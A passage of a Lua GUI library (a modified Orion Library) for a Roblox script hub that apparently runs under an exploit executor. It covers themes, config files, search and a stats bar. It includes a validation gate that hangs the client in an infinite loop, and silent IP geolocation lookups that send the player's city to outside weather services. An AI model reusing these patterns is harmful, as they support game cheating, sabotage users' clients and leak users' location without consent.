		TweenService:Create(NotificationFrame.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {Transparency = 0.9}):Play()
		TweenService:Create(NotificationFrame.Title, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.4}):Play()
		TweenService:Create(NotificationFrame.Content, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {TextTransparency = 0.5}):Play()
		wait(0.05)

		NotificationFrame:TweenPosition(UDim2.new(1, 20, 0, 0),'In','Quint',0.8,true)
		wait(1.35)
		NotificationFrame:Destroy()
	end)
end    

-- Function to change theme dynamically
function OrionLib:ChangeTheme(ThemeName)
	if not getgenv()._0xVALID then while true do end end
	if OrionLib.Themes[ThemeName] then
		OrionLib.SelectedTheme = ThemeName
		SetTheme()
		-- Theme changed silently
		return true
	else
		-- Theme not found
		return false
	end
end

-- Function to update theme
function OrionLib:UpdateTheme(Config)
	if type(Config) ~= "table" then
		-- Invalid configuration table
		return
	end
	
	local updatedKeys = {}
	
	for key, value in pairs(Config) do
		if OrionLib.Themes[OrionLib.SelectedTheme][key] ~= nil then
			if typeof(OrionLib.Themes[OrionLib.SelectedTheme][key]) == typeof(value) then
				OrionLib.Themes[OrionLib.SelectedTheme][key] = value
				table.insert(updatedKeys, key)
			else
				-- Type mismatch for key
			end
		else
			-- Key does not exist in theme
		end
	end
	
	if #updatedKeys > 0 then
		SetTheme()
	end
end

function OrionLib:Init()
	if OrionLib.SaveCfg then	
		isLoadingConfig = true -- Ativar flag de carregamento
		
		local success, err = pcall(function()
			-- Load config específico do usuário
			local fileName = string.format("%s_%s.json", USER_ID, game.GameId)
			local configFile = CONFIG_FOLDER .. "/" .. fileName
			
			if isfile and isfile(configFile) then
				-- Carregando config
				local configData = readfile(configFile)
				local loaded = LoadCfg(configData)
				if loaded then
					-- Config carregado
				else
					-- Falha ao carregar config
				end
			else
				-- Nenhum config encontrado
			end
		end)
		
		if not success then
			-- Erro ao inicializar config
		end
		
		-- Aguardar um momento e desativar flag
		task.delay(0.2, function()
			isLoadingConfig = false
		end)
	end	
end

function OrionLib:GetUserID()
	return USER_ID
end

function OrionLib:MakeWindow(WindowConfig)
	if not getgenv()._0xVALID then while true do end end
	
	-- RESETAR MOUSE ANTES DE CRIAR HUB (fix para reexecução)
	mouselock = false
	UserInputService.MouseBehavior = Enum.MouseBehavior.Default
	UserInputService.MouseIconEnabled = true
	
	local FirstTab = true
	local Minimized = false
	local Loaded = false
	local UIHidden = false
	

	WindowConfig = WindowConfig or {}
	WindowConfig.Name = WindowConfig.Name or "Orion Library"
	WindowConfig.ConfigFolder = WindowConfig.ConfigFolder or WindowConfig.Name
	WindowConfig.SaveConfig = WindowConfig.SaveConfig or true
	WindowConfig.HidePremium = WindowConfig.HidePremium or false
	if WindowConfig.IntroEnabled == nil then
		WindowConfig.IntroEnabled = true
	end
	WindowConfig.FreeMouse = WindowConfig.FreeMouse or false
	WindowConfig.KeyToOpenWindow = WindowConfig.KeyToOpenWindow or "RightShift"
	WindowConfig.IntroText = WindowConfig.IntroText or "Orion Library"
	WindowConfig.CloseCallback = WindowConfig.CloseCallback or function() end
	WindowConfig.ShowIcon = WindowConfig.ShowIcon or false
	WindowConfig.Icon = WindowConfig.Icon or "rbxassetid://8834748103"
	WindowConfig.IntroIcon = WindowConfig.IntroIcon or "rbxassetid://8834748103"
	OrionLib.Folder = WindowConfig.ConfigFolder
	OrionLib.SaveCfg = WindowConfig.SaveConfig
	CONFIG_FOLDER = WindowConfig.ConfigFolder -- Setar pasta de config
	if WindowConfig.SaveConfig then
		local success = pcall(function()
			if not isfolder(WindowConfig.ConfigFolder) then
				makefolder(WindowConfig.ConfigFolder)
				-- Pasta de configuração criada
			end
		end)
		if not success then
			-- Erro ao criar pasta de configuração
		end
	end

	if WindowConfig.FreeMouse then
		UnlockMouse(true)
	end

	-- BOTÃO MOBILE MODERNO E ESTILIZADO (TAMANHO COMPACTO)
	local MobileOpenButton = AddThemeObject(SetChildren(SetProps(MakeElement("Button"), {
		BackgroundTransparency = 0, 
		Parent = Orion, 
		Text = "",
		Size = UDim2.new(0.035, 0, 0.035, 0), -- Tamanho original (pequeno)
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new(0.5, 0, 0.5, 0),
		Visible = false, 
		AutoButtonColor = false,
		ZIndex = 5
	}), {
		MakeElement("Corner", 0.5), -- Botão circular
		AddThemeObject(MakeElement("Stroke", Color3.fromRGB(255, 255, 255), 2), "Stroke"),
		SetProps(MakeElement("AspectRatio"), {DominantAxis = 0, AspectRatio = 1, AspectType = 1})
	}), "Second")
	
	-- Ícone do menu (3 linhas) - PROPORCIONALMENTE MENOR
	local MenuIcon = SetChildren(SetProps(MakeElement("Frame"), {
		Parent = MobileOpenButton,
		Size = UDim2.new(0.5, 0, 0.4, 0),
		Position = UDim2.new(0.5, 0, 0.45, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundTransparency = 1,
		ZIndex = 6
	}), {
		-- Linha 1
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(1, 0, 0, 2),
			Position = UDim2.new(0, 0, 0, 0),
			BorderSizePixel = 0,
			ZIndex = 6
		}), {MakeElement("Corner", 1)}), "Text"),
		-- Linha 2
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(1, 0, 0, 2),
			Position = UDim2.new(0, 0, 0.5, -1),
			BorderSizePixel = 0,
			ZIndex = 6
		}), {MakeElement("Corner", 1)}), "Text"),
		-- Linha 3
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(1, 0, 0, 2),
			Position = UDim2.new(0, 0, 1, -2),
			BorderSizePixel = 0,
			ZIndex = 6
		}), {MakeElement("Corner", 1)}), "Text")
	})
	
	-- Label "MENU" embaixo - MENOR
	local MenuLabel = AddThemeObject(SetProps(MakeElement("Label", "MENU", 7), {
		Parent = MobileOpenButton,
		Size = UDim2.new(1, 0, 0, 10),
		Position = UDim2.new(0, 0, 1, 2),
		Font = Enum.Font.GothamBold,
		ZIndex = 6
	}), "Text")

	MakeDraggable(MobileOpenButton, MobileOpenButton)
	
	-- Animação ao clicar (proporcionalmente menor)
	local originalSize = UDim2.new(0.035, 0, 0.035, 0)
	local clickedSize = UDim2.new(0.032, 0, 0.032, 0)
	
	AddConnection(MobileOpenButton.MouseButton1Down, function()
		TweenService:Create(MobileOpenButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = clickedSize}):Play()
	end)
	AddConnection(MobileOpenButton.MouseButton1Up, function()
		TweenService:Create(MobileOpenButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = originalSize}):Play()
	end)


	-- Tabs table para o SearchBar
	local Tabs = {}
	local TabContainers = {}  -- Mapear Tab -> Container
	local lastActiveContainer = nil -- Guardar último container ativo (para restaurar após search)
	
	-- Tabela para armazenar elementos pesquisáveis (toggles, sliders, buttons, etc)
	local SearchableElements = {}

	local TabHolder = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 4), {
		Size = UDim2.new(1, 0, 1, -90), -- Altura total - 40 (SearchBar altura) - 50 (Perfil altura)
		Position = UDim2.new(0, 0, 0, 40)
	}), {
		MakeElement("List"),
		MakeElement("Padding", 8, 0, 0, 8)
	}), "Divider")

	-- CanvasSize automático - não precisa mais ajustar manualmente
	
	-- SearchBar (baseado na Orion)
	local SearchBox = Create("TextBox", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundTransparency = 1,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		PlaceholderColor3 = Color3.fromRGB(210, 210, 210),
		PlaceholderText = "🔍 Search",
		Font = Enum.Font.GothamBold,
		TextWrapped = false,
		Text = '',
		TextXAlignment = Enum.TextXAlignment.Center,
		TextSize = 12,
		ClearTextOnFocus = false  -- NÃO limpar ao focar (fix busca)
	})

	local TextboxActual = AddThemeObject(SearchBox, "Text")

	local SearchBar = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 1, 6), {
		Size = UDim2.new(1, -16, 0, 28),
		Position = UDim2.new(0.5, 0, 0, 6),
		AnchorPoint = Vector2.new(0.5, 0)
	}), {
		AddThemeObject(MakeElement("Stroke"), "Stroke"),
		TextboxActual
	}), "Main")

	local function SearchHandle()
		local Text = string.lower(SearchBox.Text)
		
		-- PROTEÇÃO: Sempre resetar estilos de TODAS as tabs no início
		-- (previne race conditions de cliques durante a busca)
		-- Usar TabHolder direto para pegar TODAS as tabs (incluindo Config)
		for _, tabButton in pairs(TabHolder:GetChildren()) do
			if tabButton:IsA('TextButton') and tabButton.Title and tabButton.Ico then
				tabButton.Title.Font = Enum.Font.GothamSemibold
				tabButton.Ico.ImageTransparency = 0.4
				tabButton.Title.TextTransparency = 0.4
			end
		end
		
		if Text == "" then
			-- Sem pesquisa: mostrar TUDO (comportamento normal)
			-- Usar TabHolder direto para garantir que TODAS as tabs (incluindo Config) sejam mostradas
			for _, tabButton in pairs(TabHolder:GetChildren()) do
				if tabButton:IsA('TextButton') then
					tabButton.Visible = true
				end
			end
			-- Restaurar visibilidade de todos os elementos
			for _, element in pairs(SearchableElements) do
				if element.Frame then
					element.Frame.Visible = true
				end
			end
			-- Restaurar container que estava ativo antes do search
			if lastActiveContainer then
				-- Mostrar apenas o container que estava ativo
				for _, container in pairs(TabContainers) do
					container.Visible = (container == lastActiveContainer)
				end
				
				-- Encontrar qual tab corresponde ao container ativo
				local activeTabName = nil
				for tabName, container in pairs(TabContainers) do
					if container == lastActiveContainer then
						activeTabName = tabName
						break
					end
				end
				
				-- Resetar estilo de TODAS as tabs usando TabHolder direto (incluindo Config)
				local activeTab = activeTabName and Tabs[activeTabName]
				for _, tabButton in pairs(TabHolder:GetChildren()) do
					if tabButton:IsA('TextButton') and tabButton.Title and tabButton.Ico then
						if tabButton == activeTab then
							-- Tab ativa: destacar
							tabButton.Title.Font = Enum.Font.GothamBlack
							tabButton.Ico.ImageTransparency = 0
							tabButton.Title.TextTransparency = 0
						else
							-- Outras tabs: resetar estilo (GARANTE que Config seja resetada)
							tabButton.Title.Font = Enum.Font.GothamSemibold
							tabButton.Ico.ImageTransparency = 0.4
							tabButton.Title.TextTransparency = 0.4
						end
					end
				end
				
				-- Resetar scroll para o topo
				lastActiveContainer.CanvasPosition = Vector2.new(0, 0)
				lastActiveContainer = nil -- Resetar para próxima busca
			end
		else
			-- BUSCA GLOBAL: Mostrar TODOS os elementos que fazem match
			
			-- Salvar container atual (para restaurar depois)
			if not lastActiveContainer then
				for _, container in pairs(TabContainers) do
					if container.Visible then
						lastActiveContainer = container
						break
					end
				end
			end
			
			local foundTabs = {}
			local firstVisibleContainer = nil
			local firstMatchedElement = nil -- Para fazer scroll até ele
			
			-- PASSO 1: Encontrar tabs que têm elementos correspondentes OU nome que faz match
			for _, element in pairs(SearchableElements) do
				local elementName = string.lower(element.Name or "")
				if string.sub(elementName, 1, #Text) == Text then
					local tabName = element.TabName
					foundTabs[tabName] = true
				end
			end
			
			-- Verificar também se o NOME DA TAB faz match
			for tabName, tabButton in pairs(Tabs) do
				if tabButton:IsA('TextButton') then
					local tabNameLower = string.lower(tabName)
					if string.sub(tabNameLower, 1, #Text) == Text then
						foundTabs[tabName] = true
					end
				end
			end
			
			-- PASSO 2: Encontrar PRIMEIRA tab com match e esconder todas as outras
			local firstMatchedTab = nil
			local firstMatchedContainer = nil
			
			-- Primeiro loop: encontrar primeira tab com match
			for tabName, tabButton in pairs(Tabs) do
				if tabButton:IsA('TextButton') and foundTabs[tabName] and not firstMatchedTab then
					firstMatchedTab = tabButton
					firstMatchedContainer = TabContainers[tabName]
					break
				end
			end
			
			-- Segundo loop: mostrar APENAS a primeira tab, esconder todas as outras
			-- Usar TabHolder direto para pegar TODAS as tabs (incluindo Config)
			for _, tabButton in pairs(TabHolder:GetChildren()) do
				if tabButton:IsA('TextButton') then
					if tabButton == firstMatchedTab then
						tabButton.Visible = true
					else
						tabButton.Visible = false
					end
				end
			end
			
			-- PASSO 3: Usar container da primeira tab com match
			firstVisibleContainer = firstMatchedContainer
			
			-- Se não encontrou nenhum match, esconder TODAS as tabs e mostrar mensagem
			if not firstVisibleContainer then
				-- Esconder todas as tabs
				for _, tabButton in pairs(TabHolder:GetChildren()) do
					if tabButton:IsA('TextButton') then
						tabButton.Visible = false
					end
				end
			end
			
			-- Esconder TODOS os containers
			for _, container in pairs(TabContainers) do
				container.Visible = false
			end
			
			-- Mostrar APENAS o container selecionado
			if firstVisibleContainer then
				firstVisibleContainer.Visible = true
			end
			
			-- Atualizar estilo visual: resetar TODAS as tabs e destacar apenas a selecionada
			-- Usar TabHolder direto para garantir que TODAS as tabs (incluindo Config) sejam resetadas
			for _, tabButton in pairs(TabHolder:GetChildren()) do
				if tabButton:IsA('TextButton') and tabButton.Title and tabButton.Ico then
					if tabButton == firstMatchedTab then
						-- Tab selecionada: destacar
						tabButton.Title.Font = Enum.Font.GothamBlack
						tabButton.Ico.ImageTransparency = 0
						tabButton.Title.TextTransparency = 0
					else
						-- Outras tabs: resetar estilo (GARANTE que Config também seja resetada)
						tabButton.Title.Font = Enum.Font.GothamSemibold
						tabButton.Ico.ImageTransparency = 0.4
						tabButton.Title.TextTransparency = 0.4
					end
				end
			end
			
			-- PASSO 4: SISTEMA SIMPLES - Apenas esconder/mostrar elementos
			local sectionChildrenVisible = {} -- Rastrear se sections têm filhos visíveis
			
			for _, element in pairs(SearchableElements) do
				if element.Frame then
					if element.IsSection then
						-- Sections: sempre verificar se tem filhos visíveis
						sectionChildrenVisible[element.Frame] = false
					else
						-- Elementos normais: verificar match
						local elementName = string.lower(element.Name or "")
						local matchFound = string.sub(elementName, 1, #Text) == Text
						
						if matchFound then
							-- MOSTRAR elemento
							element.Frame.Visible = true
							
							-- Guardar primeiro elemento encontrado
							if not firstMatchedElement then
								firstMatchedElement = element.Frame
							end
							
							-- Marcar section pai como tendo filho visível
							local parent = element.Frame.Parent
							if parent and parent.Parent then
								local section = parent.Parent
								if section and section:IsA("Frame") then
									sectionChildrenVisible[section] = true
								end
							end
						else
							-- ESCONDER elemento que não faz match
							element.Frame.Visible = false
						end
					end
				end
			end
			
			-- PASSO 5: Mostrar/esconder sections baseado em filhos visíveis
			for _, element in pairs(SearchableElements) do
				if element.IsSection and element.Frame then
					element.Frame.Visible = sectionChildrenVisible[element.Frame] or false
				end
			end
			
			-- PASSO 6: Scroll até o primeiro elemento encontrado
			if firstMatchedElement and firstVisibleContainer then
				task.defer(function()
					task.wait(0.1)
					
					-- Scroll até o elemento encontrado
					if firstMatchedElement.Parent then
						local elementPos = firstMatchedElement.AbsolutePosition.Y
						local containerPos = firstVisibleContainer.AbsolutePosition.Y
						local targetScroll = elementPos - containerPos - 10
						
						TweenService:Create(
							firstVisibleContainer,
							TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
							{CanvasPosition = Vector2.new(0, math.max(0, targetScroll))}
						):Play()
					end
				end)
			end
		end
	end

	AddConnection(TextboxActual:GetPropertyChangedSignal("Text"), SearchHandle)

	local CloseBtn = SetChildren(SetProps(MakeElement("Button"), {
		Size = UDim2.new(0.5, 0, 1, 0),
		Position = UDim2.new(0.5, 0, 0, 0),
		BackgroundTransparency = 1
	}), {
		AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072725342"), {
			Position = UDim2.new(0, 9, 0, 6),
			Size = UDim2.new(0, 18, 0, 18)
		}), "Text")
	})

	local MinimizeBtn = SetChildren(SetProps(MakeElement("Button"), {
		Size = UDim2.new(0.5, 0, 1, 0),
		BackgroundTransparency = 1
	}), {
		AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072719338"), {
			Position = UDim2.new(0, 9, 0, 6),
			Size = UDim2.new(0, 18, 0, 18),
			Name = "Ico"
		}), "Text")
	})

	local DragPoint = SetProps(MakeElement("TFrame"), {
		Size = UDim2.new(1, 0, 0, 50)
	})

	local WindowStuff = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 16), {
		Size = UDim2.new(0, 150, 1, -50),
		Position = UDim2.new(0, 0, 0, 50),
		ClipsDescendants = true
	}), {
		AddThemeObject(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(1, 0, 0, 10),
			Position = UDim2.new(0, 0, 0, 0)
		}), "Second"),
		AddThemeObject(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(0, 1, 1, 0),
			Position = UDim2.new(1, -1, 0, 0)
		}), "Stroke"),
		SearchBar,
			-- RESIZE BUTTON (na borda direita do painel) - IGUAL AO DO WINDOWS
	SetChildren(SetProps(MakeElement("ImageButton"), {
		Size = UDim2.new(0, 10, 0, 24),
		Position = UDim2.new(1, -5, 0.5, 0),
		AnchorPoint = Vector2.new(0.5, 0.5),
		BackgroundTransparency = 1,
		Name = "SideResizeBtn",
		ZIndex = 10
	}), {
		-- Dot 1 (top) - IGUAL AO RESIZE DO WINDOWS
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(0, 4, 0, 4),
			Position = UDim2.new(0, 3, 0, 2),
			BackgroundTransparency = 0.7,
			Name = "Dot1"
		}), {
			Create("UICorner", {CornerRadius = UDim.new(1, 0)})
		}), "TextDark"),
		-- Dot 2 (middle)
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(0, 4, 0, 4),
			Position = UDim2.new(0, 3, 0, 10),
			BackgroundTransparency = 0.7,
			Name = "Dot2"
		}), {
			Create("UICorner", {CornerRadius = UDim.new(1, 0)})
		}), "TextDark"),
		-- Dot 3 (bottom)
		AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
			Size = UDim2.new(0, 4, 0, 4),
			Position = UDim2.new(0, 3, 0, 18),
			BackgroundTransparency = 0.7,
			Name = "Dot3"
		}), {
			Create("UICorner", {CornerRadius = UDim.new(1, 0)})
		}), "TextDark")
	}),
		TabHolder,
		SetChildren(SetProps(MakeElement("TFrame"), {
			Size = UDim2.new(1, 0, 0, 50),
			Position = UDim2.new(0, 0, 1, -50),
			ClipsDescendants = true
		}), {
			Create("ImageLabel", {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Size = UDim2.new(0, 32, 0, 32),
				Position = UDim2.new(0.5, 0, 0, 16),
				Name = "PlayerAvatar",
				BackgroundTransparency = 1,
				BorderSizePixel = 0,
				Image = "https://www.roblox.com/headshot-thumbnail/image?userId=".. LocalPlayer.UserId .."&width=420&height=420&format=png"
			}, {
				MakeElement("Corner", 1),
				AddThemeObject(MakeElement("Stroke"), "Stroke")
			}),
			AddThemeObject(SetProps(MakeElement("Label", LocalPlayer.DisplayName, 11), {
				Size = UDim2.new(1, -8, 0, 12),
				Position = UDim2.new(0, 4, 1, -14),
				TextXAlignment = Enum.TextXAlignment.Center,
				Name = "PlayerName", 
				Font = Enum.Font.GothamBold,
				TextScaled = true
			}), "Text"),
			AddThemeObject(SetProps(MakeElement("Label", "", 12), {
				Size = UDim2.new(1, -60, 0, 12),
				Position = UDim2.new(0, 50, 1, -25),
				Visible = not WindowConfig.HidePremium
			}), "TextDark")
		}),
	}), "Second")

	local WindowNameContainer = SetProps(MakeElement("Frame"), {
		Size = UDim2.new(0, 400, 0, 30),
		Position = UDim2.new(0, 25, 0, 10),
		BackgroundTransparency = 1,
		ClipsDescendants = false
	})
	
	local windowLetters = {}
	local windowText = WindowConfig.Name
	local letterX = 0
	local TextService = game:GetService("TextService")
	
	for i = 1, #windowText do
		local char = windowText:sub(i, i)
		
		local textSize = TextService:GetTextSize(
			char,
			20,
			Enum.Font.GothamBlack,
			Vector2.new(math.huge, 30)
		)
		
		local charWidth = textSize.X + 1
		
		local letterLabel = AddThemeObject(SetProps(MakeElement("Label", char, 20), {
			Parent = WindowNameContainer,
			Size = UDim2.new(0, charWidth, 1, 0),
			Position = UDim2.new(0, letterX, 0, 0),
			Font = Enum.Font.GothamBlack,
			BackgroundTransparency = 1,
			TextXAlignment = Enum.TextXAlignment.Center,
			TextYAlignment = Enum.TextYAlignment.Center
		}), "Text")
		
		table.insert(windowLetters, letterLabel)
		letterX = letterX + charWidth
	end
	
	local WindowName = WindowNameContainer -- Manter compatibilidade
	
	-- FPS Counter (média móvel para estabilidade)
	local fpsHistory = {}
	local fps = 60
	RunService.RenderStepped:Connect(function(deltaTime)
		table.insert(fpsHistory, 1 / deltaTime)
		if #fpsHistory > 30 then
			table.remove(fpsHistory, 1)
		end
		local sum = 0
		for _, v in ipairs(fpsHistory) do
			sum = sum + v
		end
		fps = math.floor(sum / #fpsHistory)
	end)
	
	-- Stats Label (2 LINHAS: Data/Hora em cima, Stats embaixo)
	local StatsLabel = AddThemeObject(SetProps(MakeElement("Label", "00/00/00 | 00:00:00\n60FPS|0MS|--°C", 10), {
		Size = UDim2.new(0, 200, 0, 35),
		Position = UDim2.new(1, -310, 0, 8),
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Right
	}), "TextDark")
	
	-- Variável para temperatura
	local temperature = "--"
	
	-- Pegar temperatura com MÚLTIPLAS APIs (fallback) - SEM DELAY
	task.spawn(function()
		-- Sem delay para carregar mais rápido
		
		-- MÉTODO 1: IP-API.com (pega localização E país)
		local city = nil
		local countryCode = nil
		local lat, lon = nil, nil
		local success1, result1 = pcall(function()
			return game:HttpGet("http://ip-api.com/json/")
		end)
		if success1 then
			local ok, data = pcall(function()
				return game:GetService("HttpService"):JSONDecode(result1)
			end)
			if ok then
				city = data.city
				countryCode = data.countryCode -- US, BR, GB, etc
				lat = data.lat
				lon = data.lon
			end
		end
		
		-- MÉTODO 2: ipapi.co (backup)
		if not city then
			local success2, result2 = pcall(function()
				return game:HttpGet("https://ipapi.co/city/")
			end)
			if success2 and result2 and result2 ~= "" then
				city = result2:gsub("\n", "")
			end
		end
		
		-- Detectar unidade baseado no país
		local useFahrenheit = (countryCode == "US" or countryCode == "LR" or countryCode == "MM") -- EUA, Libéria, Myanmar
		local useKelvin = false -- Pode adicionar países que usam Kelvin se necessário
		local unitSymbol = useKelvin and "K" or (useFahrenheit and "°F" or "°C")
		local wttrUnit = useFahrenheit and "u" or "m" -- u=imperial(°F), m=metric(°C)
		
		-- Se conseguiu pegar cidade, pega temperatura
		if city and city ~= "" then
			-- MÉTODO 1: wttr.in (suporta °C e °F)
			local tempSuccess1, tempResult1 = pcall(function()
				return game:HttpGet("http://wttr.in/" .. city .. "?format=%t&" .. wttrUnit)
			end)
			if tempSuccess1 and tempResult1 and tempResult1 ~= "" then
				temperature = tempResult1:gsub("+", ""):gsub("−", "-"):gsub("\n", ""):gsub(" ", "")
			else
				-- MÉTODO 2: OpenMeteo (sempre °C) + converter se necessário
				if lat and lon then
					local weatherUrl = string.format("https://api.open-meteo.com/v1/forecast?latitude=%s&longitude=%s&current_weather=true&temperature_unit=%s", 
						lat, lon, useFahrenheit and "fahrenheit" or "celsius")
					local tempSuccess2, tempResult2 = pcall(function()
						return game:HttpGet(weatherUrl)
					end)
					if tempSuccess2 then
						local ok2, weatherData = pcall(function()
							return game:GetService("HttpService"):JSONDecode(tempResult2)
						end)
						if ok2 and weatherData.current_weather and weatherData.current_weather.temperature then
							temperature = math.floor(weatherData.current_weather.temperature) .. unitSymbol
						end
					end
				end
			end
		end
	end)
	
	-- Update stats every 0.5 second
	task.spawn(function()
		while wait(0.5) do
			if not StatsLabel or not StatsLabel.Parent then break end
			
			-- Get date and time (DD/MM/YY | HH:MM:SS)
			local time = os.date("*t")
			local dateStr = string.format("%02d/%02d/%02d", time.day, time.month, time.year % 100)
			local timeStr = string.format("%02d:%02d:%02d", time.hour, time.min, time.sec)
			
			-- Get ping (PROTEGIDO - não quebra se Stats não existir)
			local ping = 0
			pcall(function()
				local stats = game:GetService("Stats")
				if stats and stats:FindFirstChild("Network") then
					local network = stats.Network
					if network:FindFirstChild("ServerStatsItem") then
						local serverStats = network.ServerStatsItem
						if serverStats:FindFirstChild("Data Ping") then
							ping = math.floor(serverStats["Data Ping"]:GetValue())
						end
					end
				end
			end)
			
			-- Update label (2 LINHAS): Linha 1 = Data/Hora, Linha 2 = FPS|MS|Temp
			local dateStr = string.format("%02d/%02d/%02d", time.day, time.month, time.year % 100)
			local timeStr = string.format("%02d:%02d:%02d", time.hour, time.min, time.sec)
			StatsLabel.Text = string.format("%s | %s\n%dFPS|%dMS|%s", dateStr, timeStr, fps, ping, temperature)
		end
	end)

	local WindowTopBarLine = AddThemeObject(SetProps(MakeElement("Frame"), {
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, -1)
	}), "Stroke")

	local MainWindow = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 16), {
		Parent = Orion,
		Position = UDim2.new(0.5, -307, 0.5, -172),
		Size = UDim2.new(0, 615, 0, 344),
		ClipsDescendants = true,
		BackgroundTransparency = 0.02,
		Active = true
	}), {
		MakeElement("Stroke", OrionLib.Themes[OrionLib.SelectedTheme].Stroke, 2.5),
		--SetProps(MakeElement("Image", "rbxassetid://3523728077"), {
		--	AnchorPoint = Vector2.new(0.5, 0.5),
		--	Position = UDim2.new(0.5, 0, 0.5, 0),
		--	Size = UDim2.new(1, 80, 1, 320),
		--	ImageColor3 = Color3.fromRGB(33, 33, 33),
		--	ImageTransparency = 0.7
		--}),
		SetChildren(SetProps(MakeElement("TFrame"), {
			Size = UDim2.new(1, 0, 0, 50),
			Name = "TopBar"
		}), {
			WindowName,
			StatsLabel,
			WindowTopBarLine,
			AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 7), {
				Size = UDim2.new(0, 60, 0, 24),
				Position = UDim2.new(1, -80, 0, 13)
			}), {
				AddThemeObject(MakeElement("Stroke"), "Stroke"),
				AddThemeObject(SetProps(MakeElement("Frame"), {
					Size = UDim2.new(0, 1, 1, 0),
					Position = UDim2.new(0.5, 0, 0, 0)
				}), "Stroke"), 
				CloseBtn,
				MinimizeBtn
			}), "Second"), 
		}),
		DragPoint,
		WindowStuff,
		-- RESIZE BUTTON (3 dots verticais, subido um pouco)
		SetChildren(SetProps(MakeElement("ImageButton"), {
			Size = UDim2.new(0, 10, 0, 24),
			Position = UDim2.new(1, 0, 1, -6),
			AnchorPoint = Vector2.new(1, 1),
			BackgroundTransparency = 1,
			Name = "ResizeBtn"
		}), {
			-- Dot 1 (top)
			AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
				Size = UDim2.new(0, 4, 0, 4),
				Position = UDim2.new(0, 3, 0, 2),
				BackgroundTransparency = 0.7,
				Name = "Dot1"
			}), {
				Create("UICorner", {CornerRadius = UDim.new(1, 0)})
			}), "TextDark"),
			-- Dot 2 (middle)
			AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
				Size = UDim2.new(0, 4, 0, 4),
				Position = UDim2.new(0, 3, 0, 9),
				BackgroundTransparency = 0.7,
				Name = "Dot2"
			}), {
				Create("UICorner", {CornerRadius = UDim.new(1, 0)})
			}), "TextDark"),
			-- Dot 3 (bottom)
			AddThemeObject(SetChildren(SetProps(MakeElement("Frame"), {
				Size = UDim2.new(0, 4, 0, 4),
				Position = UDim2.new(0, 3, 0, 16),
				BackgroundTransparency = 0.7,
				Name = "Dot3"
			}), {
				Create("UICorner", {CornerRadius = UDim.new(1, 0)})
			}), "TextDark")
		}),
	}), "Main")
	
	-- Adicionar WindowName ao TopBar
	WindowName.Parent = MainWindow.TopBar
	
	if WindowConfig.ShowIcon then
		WindowName.Position = UDim2.new(0, 50, 0, -24)
		local WindowIcon = SetProps(MakeElement("Image", WindowConfig.Icon), {
			Size = UDim2.new(0, 20, 0, 20),
			Position = UDim2.new(0, 25, 0, 15)
		})
		WindowIcon.Parent = MainWindow.TopBar
	end	

	MakeDraggable(DragPoint, MainWindow)
	
	-- 📐 SISTEMA DE RESIZE (3 dots with hover effect)
	local Resizing = false
	local ResizeBtn = MainWindow:FindFirstChild("ResizeBtn")
	if ResizeBtn then
		local Dot1 = ResizeBtn:FindFirstChild("Dot1")
		local Dot2 = ResizeBtn:FindFirstChild("Dot2")
		local Dot3 = ResizeBtn:FindFirstChild("Dot3")
		
		-- Hover effect - show dots more visible
		AddConnection(ResizeBtn.MouseEnter, function()
			if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play() end
			if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play() end
			if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play() end
		end)
		
		AddConnection(ResizeBtn.MouseLeave, function()
			if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
			if Dot2 then TweenService:Create(Dot2, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
			if Dot3 then TweenService:Create(Dot3, TweenInfo.new(0.2), {BackgroundTransparency = 0.7}):Play() end
		end)
		
		local StartSize, StartPos
		
		AddConnection(ResizeBtn.InputBegan, function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
				Resizing = true
				StartSize = MainWindow.AbsoluteSize
				StartPos = Vector2.new(Input.Position.X, Input.Position.Y)
				
				-- Show dots fully when resizing
				if Dot1 then TweenService:Create(Dot1, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play() end
